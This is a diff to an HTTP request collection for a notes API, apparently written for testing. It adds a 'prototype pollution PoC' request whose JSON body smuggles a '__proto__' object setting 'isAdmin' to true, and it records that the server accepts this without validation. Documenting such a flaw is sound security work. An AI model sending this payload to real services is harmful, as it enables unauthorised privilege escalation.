@@ -70,6 +70,17 @@ Content-Type: application/json
   "body": "updated body"
 }
 
+### Update note — prototype pollution PoC (accepted silently, no schema validation)
+PUT {{baseUrl}}/notes/NOTE_ID
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{
+  "title": "Polluted attempt",
+  "body": "payload",
+  "__proto__": { "isAdmin": true }
+}
+
 ### Delete note (replace NOTE_ID)
 DELETE {{baseUrl}}/notes/NOTE_ID
 Authorization: Bearer {{token}}
